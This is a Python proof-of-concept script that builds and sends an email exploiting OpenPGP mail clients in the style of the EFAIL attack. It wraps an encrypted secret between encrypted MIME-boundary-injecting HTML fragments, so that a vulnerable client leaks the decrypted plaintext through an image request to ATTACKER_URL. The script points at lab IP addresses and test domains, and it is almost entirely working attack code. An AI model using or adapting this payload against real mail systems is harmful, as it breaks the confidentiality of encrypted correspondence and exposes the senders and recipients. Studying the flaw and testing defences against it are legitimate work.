#!/usr/bin/env -S uv run
# /// script
# requires-python = ">=3.10"
# dependencies = [
#   "pgpy",
#   "standard-imghdr",
# ]
# ///
"""Send an inline (armored) OpenPGP message via plain SMTP (PGPy, no gpg binary)."""

from __future__ import annotations

ATTACKER_URL = "http://192.168.100.1:8000"

import os
import smtplib
from email.utils import formatdate
from pathlib import Path

import pgpy
from pgpy import PGPMessage


SMTP_HOST = "192.168.100.2"
SMTP_PORT = 25
RECIPIENT = "pgp1@internal.test"
SENDER = "separator@external.test"
PUBKEY = Path("pk.asc")


def encrypt_inline_armor(plaintext: bytes, pubkey_path: Path) -> str:
    """Encrypt plaintext to an ASCII-armored OpenPGP message (inline PGP body)."""
    key, _ = pgpy.PGPKey.from_file(str(pubkey_path))
    message = PGPMessage.new(plaintext)
    encrypted = key.encrypt(message)
    return str(encrypted)


def main() -> int:
    secret = encrypt_inline_armor("secret message: " + os.urandom(10).hex(), PUBKEY)

    armored1 = encrypt_inline_armor(f"""--separator2--

--separator1
Content-Type: text/html

<html>
<body>
<img src="{ATTACKER_URL}/
""", PUBKEY)
    armored2 = encrypt_inline_armor("""
" />
</body>
</html>
""", PUBKEY)

    msg = f"""From: {SENDER}
To: {RECIPIENT}
Subject: inline PGP test
Date: {formatdate(localtime=True)}
Content-Type: multipart/mixed; boundary="separator1"

--separator1
Content-Type: multipart/mixed; boundary="separator2"

--separator2
Content-Type: text/html; name="empty.html"
Content-Disposition: attachment
Content-Transfer-Encoding: 8bit

{armored1}

--separator2
Content-Type: text/plain
Content-Transfer-Encoding: 8bit

{secret}

--separator2
Content-Type: text/html
Content-Transfer-Encoding: 8bit

{armored2}

--separator2--
--separator1--
"""

    with smtplib.SMTP(SMTP_HOST, SMTP_PORT, timeout=30) as smtp:
            smtp.sendmail(SENDER, [RECIPIENT], msg.encode())

if __name__ == "__main__":
    raise SystemExit(main())
